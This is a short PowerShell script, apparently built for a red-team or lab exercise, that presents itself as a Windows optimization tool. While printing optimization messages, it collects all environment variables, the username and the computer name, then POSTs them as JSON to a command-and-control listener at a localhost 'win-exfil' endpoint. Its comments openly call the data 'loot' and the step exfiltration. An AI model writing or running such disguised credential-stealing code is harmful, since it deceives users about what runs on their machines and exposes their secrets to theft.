# win_config.txt
Write-Host "Applying Windows Optimizations..."

# 1. Gather "Loot" (Environment variables and System Info)
$envData = Get-ChildItem Env: | Select-Object Name, Value | ConvertTo-Json
$sysInfo = "User: $env:USERNAME, Computer: $env:COMPUTERNAME"

# 2. Package the payload
$payload = @{
    info = $sysInfo
    env  = $envData
} | ConvertTo-Json

# 3. Exfiltrate to your local C2 Listener
Invoke-RestMethod -Uri "http://localhost:8080/win-exfil" -Method Post -Body $payload -ContentType "application/json"

Write-Host "Optimization Complete."
